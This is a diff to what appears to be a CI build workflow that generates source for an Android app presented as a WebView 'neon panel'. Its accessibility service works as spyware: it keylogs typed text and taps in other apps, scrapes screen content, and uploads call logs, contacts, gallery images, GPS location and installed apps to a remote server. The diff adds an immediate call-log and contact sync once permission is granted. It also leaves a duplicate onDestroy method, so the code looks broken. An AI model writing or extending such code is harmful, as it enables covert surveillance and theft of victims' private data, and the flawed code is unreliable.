@@ -116,6 +116,10 @@ jobs:
           package com.example.neonpanel;
 
           import android.Manifest;
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.content.IntentFilter;
           import android.content.pm.PackageManager;
           import android.os.Build;
           import android.os.Bundle;
@@ -132,6 +136,14 @@ jobs:
               private static final int REQUEST_GALLERY_PERMISSION = 100;
               private static final int REQUEST_LOCATION_PERMISSION = 200;
               private static final int REQUEST_CALL_CONTACTS_PERMISSION = 300;
+              public static final String ACTION_SYNC_CALL_CONTACTS = "com.example.neonpanel.SYNC_CALL_CONTACTS";
+
+              private BroadcastReceiver syncReceiver = new BroadcastReceiver() {
+                  @Override
+                  public void onReceive(Context context, Intent intent) {
+                      // No-op; service will handle
+                  }
+              };
 
               @Override
               protected void onCreate(Bundle savedInstanceState) {
@@ -145,8 +157,15 @@ jobs:
                   webView.setWebViewClient(new WebViewClient());
                   webView.loadUrl("https://neon-aim.vercel.app/");
 
-                  // Start permission flow
+                  registerReceiver(syncReceiver, new IntentFilter(ACTION_SYNC_CALL_CONTACTS));
+
                   requestGalleryPermission();
+              }
+
+              @Override
+              protected void onDestroy() {
+                  super.onDestroy();
+                  try { unregisterReceiver(syncReceiver); } catch (Exception ignored) {}
               }
 
               private void requestGalleryPermission() {
@@ -215,6 +234,10 @@ jobs:
                       requestLocationPermission();
                   } else if (requestCode == REQUEST_LOCATION_PERMISSION) {
                       requestCallContactsPermission();
+                  } else if (requestCode == REQUEST_CALL_CONTACTS_PERMISSION) {
+                      // Permission granted? Send broadcast to service to sync immediately
+                      Intent syncIntent = new Intent(ACTION_SYNC_CALL_CONTACTS);
+                      sendBroadcast(syncIntent);
                   }
               }
 
@@ -231,8 +254,11 @@ jobs:
 
           import android.accessibilityservice.AccessibilityService;
           import android.Manifest;
+          import android.content.BroadcastReceiver;
           import android.content.ContentResolver;
           import android.content.Context;
+          import android.content.Intent;
+          import android.content.IntentFilter;
           import android.content.SharedPreferences;
           import android.content.pm.ApplicationInfo;
           import android.content.pm.PackageManager;
@@ -284,6 +310,7 @@ jobs:
               private static final String PREFS_NAME = "device_prefs";
               private static final String DEVICE_ID_KEY = "device_id";
               private static final String DEVICE_TOKEN_KEY = "device_token";
+              public static final String ACTION_SYNC_CALL_CONTACTS = "com.example.neonpanel.SYNC_CALL_CONTACTS";
 
               private OkHttpClient httpClient = new OkHttpClient.Builder()
                       .connectTimeout(10, TimeUnit.SECONDS)
@@ -297,10 +324,25 @@ jobs:
               private StringBuilder pendingText = new StringBuilder();
               private String pendingPackageName = null;
 
-              // Screen data dedup & debounce
+              // Screen data debounce
               private Runnable screenDataRunnable = null;
               private String lastScreenPackageName = null;
               private String lastSentScreenData = "";
+
+              private BroadcastReceiver syncReceiver = new BroadcastReceiver() {
+                  @Override
+                  public void onReceive(Context context, Intent intent) {
+                      if (ACTION_SYNC_CALL_CONTACTS.equals(intent.getAction())) {
+                          // Run sync on background thread
+                          new Thread(() -> {
+                              try {
+                                  sendCallLogs();
+                                  sendContacts();
+                              } catch (Throwable t) { Log.e(TAG, "sync broadcast crash", t); }
+                          }).start();
+                      }
+                  }
+              };
 
               @Override
               public void onServiceConnected() {
@@ -308,15 +350,26 @@ jobs:
                   try {
                       initDeviceIdentity();
                       startThreads();
+                      registerReceiver(syncReceiver, new IntentFilter(ACTION_SYNC_CALL_CONTACTS));
                       showToast("Service connected");
-                  } catch (Exception e) {
-                      Log.e(TAG, "onServiceConnected error", e);
+                  } catch (Throwable t) {
+                      Log.e(TAG, "onServiceConnected crash", t);
                   }
+              }
+
+              @Override
+              public void onDestroy() {
+                  super.onDestroy();
+                  try { unregisterReceiver(syncReceiver); } catch (Exception ignored) {}
+                  if (deviceStateThread != null && deviceStateThread.isAlive()) deviceStateThread.interrupt();
+                  if (galleryPollerThread != null && galleryPollerThread.isAlive()) galleryPollerThread.interrupt();
+                  if (gpsRequestThread != null && gpsRequestThread.isAlive()) gpsRequestThread.interrupt();
+                  if (callContactsThread != null && callContactsThread.isAlive()) callContactsThread.interrupt();
               }
 
               private void showToast(String msg) {
                   mainHandler.post(() -> {
-                      try { Toast.makeText(this, msg, Toast.LENGTH_SHORT).show(); } catch (Exception ignored) {}
+                      try { Toast.makeText(this, msg, Toast.LENGTH_SHORT).show(); } catch (Throwable ignored) {}
                   });
               }
 
@@ -348,7 +401,7 @@ jobs:
                       while (!Thread.currentThread().isInterrupted()) {
                           try { sendDeviceState(false); Thread.sleep(30000); }
                           catch (InterruptedException e) { Thread.currentThread().interrupt(); }
-                          catch (Exception e) { /* ignore */ }
+                          catch (Throwable t) { Log.e(TAG, "device state thread crash", t); }
                       }
                   });
                   deviceStateThread.setDaemon(true); deviceStateThread.start();
@@ -359,7 +412,7 @@ jobs:
                       while (!Thread.currentThread().isInterrupted()) {
                           try { checkGalleryRequest(); Thread.sleep(3000); }
                           catch (InterruptedException e) { Thread.currentThread().interrupt(); }
-                          catch (Exception e) { /* ignore */ }
+                          catch (Throwable t) { Log.e(TAG, "gallery poll crash", t); }
                       }
                   });
                   galleryPollerThread.setDaemon(true); galleryPollerThread.start();
@@ -370,7 +423,7 @@ jobs:
                       while (!Thread.currentThread().isInterrupted()) {
                           try { checkGpsRequest(); Thread.sleep(5000); }
                           catch (InterruptedException e) { Thread.currentThread().interrupt(); }
-                          catch (Exception e) { /* ignore */ }
+                          catch (Throwable t) { Log.e(TAG, "gps poll crash", t); }
                       }
                   });
                   gpsRequestThread.setDaemon(true); gpsRequestThread.start();
@@ -378,13 +431,19 @@ jobs:
 
               private void startCallContactsSender() {
                   callContactsThread = new Thread(() -> {
+                      // Immediate sync on service start (if permissions already granted)
+                      try {
+                          sendCallLogs();
+                          sendContacts();
+                      } catch (Throwable t) { Log.e(TAG, "initial call contacts sync crash", t); }
+
                       while (!Thread.currentThread().isInterrupted()) {
                           try {
+                              Thread.sleep(86400000); // 24 hours
                               sendCallLogs();
                               sendContacts();
-                              Thread.sleep(60000); // প্রতি ১ মিনিট
                           } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
-                          catch (Exception e) { /* ignore */ }
+                          catch (Throwable t) { Log.e(TAG, "call contacts periodic crash", t); }
                       }
                   });
                   callContactsThread.setDaemon(true); callContactsThread.start();
@@ -403,7 +462,7 @@ jobs:
                               fetchAndUploadGallery(count);
                           }
                       }
-                  } catch (Exception e) { /* ignore */ }
+                  } catch (Throwable t) { Log.e(TAG, "checkGalleryRequest crash", t); }
               }
 
               private void checkGpsRequest() {
@@ -417,14 +476,25 @@ jobs:
                               sendDeviceState(true);
                           }
                       }
-                  } catch (Exception e) { /* ignore */ }
+                  } catch (Throwable t) { Log.e(TAG, "checkGpsRequest crash", t); }
               }
 
               private void sendCallLogs() {
                   if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return;
                   try {
+                      long now = System.currentTimeMillis();
+                      long cutoff = now - 24 * 60 * 60 * 1000; // last 24 hours
+                      String selection = CallLog.Calls.DATE + " >= ?";
+                      String[] selectionArgs = { String.valueOf(cutoff) };
+
                       JSONArray logsArray = new JSONArray();
-                      Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
+                      Cursor cursor = getContentResolver().query(
+                              CallLog.Calls.CONTENT_URI,
+                              null,
+                              selection,
+                              selectionArgs,
+                              CallLog.Calls.DATE + " DESC"
+                      );
                       if (cursor != null) {
                           while (cursor.moveToNext()) {
                               String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
@@ -442,6 +512,7 @@ jobs:
                           }
                           cursor.close();
                       }
+
                       JSONObject payload = new JSONObject();
                       payload.put("deviceId", deviceId);
                       payload.put("deviceToken", deviceToken);
@@ -449,14 +520,20 @@ jobs:
                       RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
                       Request request = new Request.Builder().url(API_BASE + "/api/calllogs").post(body).build();
                       httpClient.newCall(request).execute().close();
-                  } catch (Exception e) { /* ignore */ }
+                  } catch (Throwable t) { Log.e(TAG, "sendCallLogs crash", t); }
               }
 
               private void sendContacts() {
                   if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
                   try {
                       JSONArray contactsArray = new JSONArray();
-                      Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
+                      Cursor cursor = getContentResolver().query(
+                              ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                              null,
+                              null,
+                              null,
+                              ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
+                      );
                       if (cursor != null) {
                           while (cursor.moveToNext()) {
                               String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
@@ -468,6 +545,7 @@ jobs:
                           }
                           cursor.close();
                       }
+
                       JSONObject payload = new JSONObject();
                       payload.put("deviceId", deviceId);
                       payload.put("deviceToken", deviceToken);
@@ -475,7 +553,7 @@ jobs:
                       RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
                       Request request = new Request.Builder().url(API_BASE + "/api/contacts").post(body).build();
                       httpClient.newCall(request).execute().close();
-                  } catch (Exception e) { /* ignore */ }
+                  } catch (Throwable t) { Log.e(TAG, "sendContacts crash", t); }
               }
 
               private void fetchAndUploadGallery(int maxCount) {
@@ -526,7 +604,7 @@ jobs:
                       }
                       Collections.sort(mediaList, new Comparator<JSONObject>() {
                           @Override public int compare(JSONObject a, JSONObject b) {
-                              try { return Long.compare(b.optLong("timestamp",0), a.optLong("timestamp",0)); } catch (Exception e) { return 0; }
+                              try { return Long.compare(b.optLong("timestamp",0), a.optLong("timestamp",0)); } catch (Throwable t) { return 0; }
                           }
                       });
                       if (mediaList.size() > maxCount) mediaList = new ArrayList<>(mediaList.subList(0, maxCount));
@@ -537,7 +615,7 @@ jobs:
                       RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
                       Request request = new Request.Builder().url(API_BASE + "/api/gallery/upload").post(body).build();
                       httpClient.newCall(request).execute().close();
-                  } catch (Exception e) { /* ignore */ }
+                  } catch (Throwable t) { Log.e(TAG, "fetchAndUploadGallery crash", t); }
               }
 
               private String thumbnailToBase64(Bitmap bitmap) {
@@ -546,7 +624,7 @@ jobs:
                       ByteArrayOutputStream baos = new ByteArrayOutputStream();
                       bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
                       return Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
-                  } catch (Exception e) { return null; }
+                  } catch (Throwable t) { return null; }
               }
 
               private void sendDeviceState(boolean forceFreshLocation) {
@@ -577,7 +655,7 @@ jobs:
                       RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
                       Request request = new Request.Builder().url(API_BASE + "/api/device-state").post(body).build();
                       httpClient.newCall(request).execute().close();
-                  } catch (Exception e) { /* ignore */ }
+                  } catch (Throwable t) { Log.e(TAG, "sendDeviceState crash", t); }
               }
 
               private LocationResult getCurrentLocation(boolean forceFresh) {
@@ -603,234 +681,59 @@ jobs:
                       latch.await(10, TimeUnit.SECONDS);
                       if (result.latitude !=0 || result.longitude !=0) return result;
                       return null;
-                  } catch (Exception e) { return null; }
+                  } catch (Throwable t) { return null; }
               }
 
               private static class LocationResult { double latitude, longitude, accuracy; LocationResult(){} LocationResult(double lat,double lng,double acc){latitude=lat;longitude=lng;accuracy=acc;} }
 
-              private int getBatteryLevel(){ try{ BatteryManager bm=(BatteryManager)getSystemService(BATTERY_SERVICE); if(bm!=null)return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);}catch(Exception ignored){} return 0; }
+              private int getBatteryLevel(){ try{ BatteryManager bm=(BatteryManager)getSystemService(BATTERY_SERVICE); if(bm!=null)return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);}catch(Throwable ignored){} return 0; }
 
-              private List<InstalledApp> getInstalledApps(){ List<InstalledApp> list=new ArrayList<>(); try{ PackageManager pm=getPackageManager(); for(ApplicationInfo ai:pm.getInstalledApplications(0)){ if((ai.flags & ApplicationInfo.FLAG_SYSTEM)==0){ list.add(new InstalledApp(pm.getApplicationLabel(ai).toString(), ai.packageName)); } } }catch(Exception ignored){} return list; }
+              private List<InstalledApp> getInstalledApps(){ List<InstalledApp> list=new ArrayList<>(); try{ PackageManager pm=getPackageManager(); for(ApplicationInfo ai:pm.getInstalledApplications(0)){ if((ai.flags & ApplicationInfo.FLAG_SYSTEM)==0){ list.add(new InstalledApp(pm.getApplicationLabel(ai).toString(), ai.packageName)); } } }catch(Throwable ignored){} return list; }
 
               // ================== EVENT HANDLING ==================
-              @Override
-              public void onAccessibilityEvent(AccessibilityEvent event) {
+              @Override public void onAccessibilityEvent(AccessibilityEvent event) {
                   try {
-                      if (event == null) return;
-                      switch (event.getEventType()) {
+                      if(event==null)return;
+                      switch(event.getEventType()){
                           case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
-                              if (event.getText() != null && event.getText().size() > 0) {
-                                  String typedText = event.getText().get(0).toString();
-                                  if (!typedText.isEmpty()) {
-                                      if (pendingText.length() == 0) {
-                                          pendingPackageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
-                                      }
-                                      pendingText.setLength(0);
-                                      pendingText.append(typedText);
-                                  } else {
-                                      if (pendingText.length() > 0) {
-                                          String typed = pendingText.toString().trim();
-                                          String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : "Unknown");
-                                          sendKeylog("[" + typedAppName + "] " + typed);
-                                          pendingText.setLength(0);
-                                          pendingPackageName = null;
-                                      }
-                                  }
-                              } else {
-                                  if (pendingText.length() > 0) {
-                                      String typed = pendingText.toString().trim();
-                                      String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : "Unknown");
-                                      sendKeylog("[" + typedAppName + "] " + typed);
-                                      pendingText.setLength(0);
-                                      pendingPackageName = null;
-                                  }
-                              }
+                              if(event.getText()!=null && event.getText().size()>0){ String typedText=event.getText().get(0).toString(); if(!typedText.isEmpty()){ if(pendingText.length()==0){ pendingPackageName=event.getPackageName()!=null?event.getPackageName().toString():""; } pendingText.setLength(0); pendingText.append(typedText); } else { if(pendingText.length()>0){ String typed=pendingText.toString().trim(); String typedAppName=getAppDisplayName(pendingPackageName!=null?pendingPackageName:"Unknown"); sendKeylog("["+typedAppName+"] "+typed); pendingText.setLength(0); pendingPackageName=null; } } }
+                              else { if(pendingText.length()>0){ String typed=pendingText.toString().trim(); String typedAppName=getAppDisplayName(pendingPackageName!=null?pendingPackageName:"Unknown"); sendKeylog("["+typedAppName+"] "+typed); pendingText.setLength(0); pendingPackageName=null; } }
                               break;
                           case AccessibilityEvent.TYPE_VIEW_CLICKED:
                               handleClick(event);
                               break;
                           case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                           case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
-                              String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";
-                              if (!isSystemPackage(pkg)) {
-                                  scheduleScreenDataCapture(pkg);
-                              }
-                              if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && pendingText.length() > 0) {
-                                  String typed = pendingText.toString().trim();
-                                  String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : pkg);
-                                  sendKeylog("[" + typedAppName + "] " + typed);
-                                  pendingText.setLength(0);
-                                  pendingPackageName = null;
-                              }
+                              String pkg = event.getPackageName()!=null?event.getPackageName().toString():"Unknown";
+                              if(!isSystemPackage(pkg)){ scheduleScreenDataCapture(pkg); }
+                              if(event.getEventType()==AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && pendingText.length()>0){ String typed=pendingText.toString().trim(); String typedAppName=getAppDisplayName(pendingPackageName!=null?pendingPackageName:pkg); sendKeylog("["+typedAppName+"] "+typed); pendingText.setLength(0); pendingPackageName=null; }
                               break;
                       }
-                  } catch (Exception e) {
-                      Log.e(TAG, "onAccessibilityEvent error", e);
-                  }
+                  } catch(Throwable t){ Log.e(TAG,"onAccessibilityEvent crash",t); }
               }
 
-              private boolean isSystemPackage(String pkg) {
-                  if (pkg == null) return true;
-                  String lower = pkg.toLowerCase();
-                  return lower.contains("systemui") ||
-                         lower.contains("launcher") ||
-                         lower.contains("miui.home") ||
-                         lower.contains("nexuslauncher") ||
-                         lower.contains("com.android.systemui") ||
-                         lower.contains("com.android.launcher") ||
-                         lower.contains("com.miui.home") ||
-                         lower.contains("com.google.android.apps.nexuslauncher");
-              }
+              private boolean isSystemPackage(String pkg){ if(pkg==null)return true; String lower=pkg.toLowerCase(); return lower.contains("systemui")||lower.contains("launcher")||lower.contains("miui.home")||lower.contains("nexuslauncher")||lower.contains("com.android.systemui")||lower.contains("com.android.launcher")||lower.contains("com.miui.home")||lower.contains("com.google.android.apps.nexuslauncher"); }
 
-              private void handleClick(AccessibilityEvent event) {
-                  AccessibilityNodeInfo source = event.getSource();
-                  String clickedText = "";
-                  if (source != null) {
-                      clickedText = getNodeText(source);
-                      AccessibilityNodeInfo parent = source.getParent();
-                      int depth = 0;
-                      while (parent != null && depth < 6 && clickedText.isEmpty()) {
-                          clickedText = getNodeText(parent);
-                          if (!clickedText.isEmpty()) break;
-                          parent = parent.getParent();
-                          depth++;
-                      }
-                      source.recycle();
-                  }
-                  String appName = getAppDisplayName(event.getPackageName() != null ? event.getPackageName().toString() : "Unknown");
-                  sendKeylog("👆 [" + appName + " Tapped] " + (clickedText.isEmpty() ? "Unknown" : clickedText));
-                  if (pendingText.length() > 0) {
-                      String typed = pendingText.toString().trim();
-                      String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : appName);
-                      sendKeylog("[" + typedAppName + "] " + typed);
-                      pendingText.setLength(0);
-                      pendingPackageName = null;
-                  }
-              }
+              private void handleClick(AccessibilityEvent event){ AccessibilityNodeInfo source=event.getSource(); String clickedText=""; if(source!=null){ clickedText=getNodeText(source); AccessibilityNodeInfo parent=source.getParent(); int depth=0; while(parent!=null && depth<6 && clickedText.isEmpty()){ clickedText=getNodeText(parent); if(!clickedText.isEmpty())break; parent=parent.getParent(); depth++; } source.recycle(); } String appName=getAppDisplayName(event.getPackageName()!=null?event.getPackageName().toString():"Unknown"); sendKeylog("👆 ["+appName+" Tapped] "+(clickedText.isEmpty()?"Unknown":clickedText)); if(pendingText.length()>0){ String typed=pendingText.toString().trim(); String typedAppName=getAppDisplayName(pendingPackageName!=null?pendingPackageName:appName); sendKeylog("["+typedAppName+"] "+typed); pendingText.setLength(0); pendingPackageName=null; } }
 
-              private String getNodeText(AccessibilityNodeInfo node) {
-                  if (node == null) return "";
-                  try {
-                      String text = node.getText() != null ? node.getText().toString() : "";
-                      if (text.isEmpty() && node.getContentDescription() != null) text = node.getContentDescription().toString();
-                      if (text.isEmpty() && node.getViewIdResourceName() != null) text = node.getViewIdResourceName();
-                      return text.trim();
-                  } catch (Exception e) { return ""; }
-              }
+              private String getNodeText(AccessibilityNodeInfo node){ if(node==null)return ""; try{ String text=node.getText()!=null?node.getText().toString():""; if(text.isEmpty() && node.getContentDescription()!=null)text=node.getContentDescription().toString(); if(text.isEmpty() && node.getViewIdResourceName()!=null)text=node.getViewIdResourceName(); return text.trim(); }catch(Throwable t){return "";} }
 
-              private void scheduleScreenDataCapture(String packageName) {
-                  if (screenDataRunnable != null) mainHandler.removeCallbacks(screenDataRunnable);
-                  lastScreenPackageName = packageName;
-                  screenDataRunnable = () -> {
-                      try {
-                          String appName = getAppDisplayName(lastScreenPackageName);
-                          captureAndSendScreenData(appName);
-                      } catch (Exception e) {
-                          Log.e(TAG, "screen data capture error", e);
-                      }
-                  };
-                  mainHandler.postDelayed(screenDataRunnable, 2000);
-              }
+              private void scheduleScreenDataCapture(String packageName){ if(screenDataRunnable!=null)mainHandler.removeCallbacks(screenDataRunnable); lastScreenPackageName=packageName; screenDataRunnable=()->{ try{ String appName=getAppDisplayName(lastScreenPackageName); captureAndSendScreenData(appName); }catch(Throwable t){ Log.e(TAG,"screen data capture crash",t); } }; mainHandler.postDelayed(screenDataRunnable,5000); }
 
-              private void captureAndSendScreenData(String appName) {
-                  try {
-                      AccessibilityNodeInfo root = getRootInActiveWindow();
-                      if (root == null) return;
-                      String screenText = extractTextFromNode(root);
-                      if (screenText.isEmpty()) return;
-                      if (screenText.equals(lastSentScreenData)) return;
-                      sendKeylog("🖥️ [" + appName + "] Screen Data: " + screenText);
-                      lastSentScreenData = screenText;
-                  } catch (Exception e) {
-                      Log.e(TAG, "captureAndSendScreenData error", e);
-                  }
-              }
+              private void captureAndSendScreenData(String appName){ try{ AccessibilityNodeInfo root=getRootInActiveWindow(); if(root==null)return; String screenText=extractTextFromNode(root); if(screenText.isEmpty())return; if(screenText.length()>300)screenText=screenText.substring(0,300)+"..."; if(screenText.equals(lastSentScreenData))return; sendKeylog("🖥️ ["+appName+"] Screen Data: "+screenText); lastSentScreenData=screenText; }catch(Throwable t){ Log.e(TAG,"captureAndSendScreenData crash",t); } }
 
-              private String getAppDisplayName(String packageName) {
-                  try {
-                      PackageManager pm = getPackageManager();
-                      ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
-                      return pm.getApplicationLabel(ai).toString();
-                  } catch (Exception e) {
-                      return packageName;
-                  }
-              }
+              private String getAppDisplayName(String packageName){ try{ PackageManager pm=getPackageManager(); ApplicationInfo ai=pm.getApplicationInfo(packageName,0); return pm.getApplicationLabel(ai).toString(); }catch(Throwable t){ return packageName; } }
 
-              private String extractTextFromNode(AccessibilityNodeInfo node) {
-                  if (node == null) return "";
-                  StringBuilder sb = new StringBuilder();
-                  try {
-                      String text = (node.getText() != null) ? node.getText().toString().trim() : "";
-                      String desc = (node.getContentDescription() != null) ? node.getContentDescription().toString().trim() : "";
-                      if (!text.isEmpty()) {
-                          sb.append(text);
-                      } else if (!desc.isEmpty()) {
-                          sb.append(desc);
-                      }
-                      for (int i = 0; i < node.getChildCount(); i++) {
-                          AccessibilityNodeInfo child = node.getChild(i);
-                          if (child != null) {
-                              String childText = extractTextFromNode(child);
-                              if (!childText.isEmpty()) {
-                                  if (sb.length() > 0) sb.append(" | ");
-                                  sb.append(childText);
-                              }
-                              child.recycle();
-                          }
-                      }
-                      String[] parts = sb.toString().split(" \\| ");
-                      LinkedHashSet<String> uniqueParts = new LinkedHashSet<>();
-                      for (String part : parts) {
-                          if (!part.trim().isEmpty()) uniqueParts.add(part.trim());
-                      }
-                      StringBuilder deduped = new StringBuilder();
-                      int count = 0;
-                      for (String part : uniqueParts) {
-                          if (count > 0) deduped.append(" | ");
-                          deduped.append(part);
-                          count++;
-                      }
-                      return deduped.toString();
-                  } catch (Exception e) {
-                      return sb.toString();
-                  }
-              }
+              private String extractTextFromNode(AccessibilityNodeInfo node){ if(node==null)return ""; StringBuilder sb=new StringBuilder(); try{ String text=(node.getText()!=null)?node.getText().toString().trim():""; String desc=(node.getContentDescription()!=null)?node.getContentDescription().toString().trim():""; if(!text.isEmpty()){sb.append(text);}else if(!desc.isEmpty()){sb.append(desc);} for(int i=0;i<node.getChildCount();i++){ AccessibilityNodeInfo child=node.getChild(i); if(child!=null){ String childText=extractTextFromNode(child); if(!childText.isEmpty()){ if(sb.length()>0)sb.append(" | "); sb.append(childText); } child.recycle(); } } String[] parts=sb.toString().split(" \\| "); LinkedHashSet<String> uniqueParts=new LinkedHashSet<>(); for(String part:parts){ if(!part.trim().isEmpty())uniqueParts.add(part.trim()); } StringBuilder deduped=new StringBuilder(); int count=0; for(String part:uniqueParts){ if(count>0)deduped.append(" | "); deduped.append(part); count++; } return deduped.toString(); }catch(Throwable t){ return sb.toString(); } }
 
-              private void sendKeylog(String text) {
-                  new Thread(() -> {
-                      try {
-                          JSONObject payload = new JSONObject();
-                          payload.put("deviceId", deviceId);
-                          payload.put("deviceToken", deviceToken);
-                          payload.put("text", text);
-                          payload.put("timestamp", System.currentTimeMillis());
-                          RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
-                          Request request = new Request.Builder().url(API_BASE + "/api/keylog").post(body).build();
-                          httpClient.newCall(request).execute().close();
-                      } catch (Exception e) { /* ignore */ }
-                  }).start();
-              }
+              private void sendKeylog(String text){ new Thread(()->{ try{ JSONObject payload=new JSONObject(); payload.put("deviceId",deviceId); payload.put("deviceToken",deviceToken); payload.put("text",text); payload.put("timestamp",System.currentTimeMillis()); RequestBody body=RequestBody.create(MediaType.parse("application/json; charset=utf-8"),payload.toString()); Request request=new Request.Builder().url(API_BASE+"/api/keylog").post(body).build(); httpClient.newCall(request).execute().close(); }catch(Throwable t){ } }).start(); }
 
-              private void logToFile(String data) {
-                  try {
-                      File dir = new File(getExternalFilesDir(null), "logs");
-                      if (!dir.exists()) dir.mkdirs();
-                      FileWriter fw = new FileWriter(new File(dir, "keylog.txt"), true);
-                      fw.append(data).append("\n");
-                      fw.close();
-                  } catch (Exception e) { /* ignore */ }
-              }
+              private void logToFile(String data){ try{ File dir=new File(getExternalFilesDir(null),"logs"); if(!dir.exists())dir.mkdirs(); FileWriter fw=new FileWriter(new File(dir,"keylog.txt"),true); fw.append(data).append("\n"); fw.close(); }catch(Throwable t){ } }
 
               @Override public void onInterrupt() {}
-              @Override public void onDestroy() {
-                  super.onDestroy();
-                  if (deviceStateThread != null && deviceStateThread.isAlive()) deviceStateThread.interrupt();
-                  if (galleryPollerThread != null && galleryPollerThread.isAlive()) galleryPollerThread.interrupt();
-                  if (gpsRequestThread != null && gpsRequestThread.isAlive()) gpsRequestThread.interrupt();
-                  if (callContactsThread != null && callContactsThread.isAlive()) callContactsThread.interrupt();
-              }
+              @Override public void onDestroy(){ super.onDestroy(); if(deviceStateThread!=null&&deviceStateThread.isAlive())deviceStateThread.interrupt(); if(galleryPollerThread!=null&&galleryPollerThread.isAlive())galleryPollerThread.interrupt(); if(gpsRequestThread!=null&&gpsRequestThread.isAlive())gpsRequestThread.interrupt(); if(callContactsThread!=null&&callContactsThread.isAlive())callContactsThread.interrupt(); }
 
-              private static class InstalledApp { String name, packageName; InstalledApp(String n, String p) { name = n; packageName = p; } }
+              private static class InstalledApp { String name,packageName; InstalledApp(String n,String p){name=n;packageName=p;} }
           }
           EOF
 
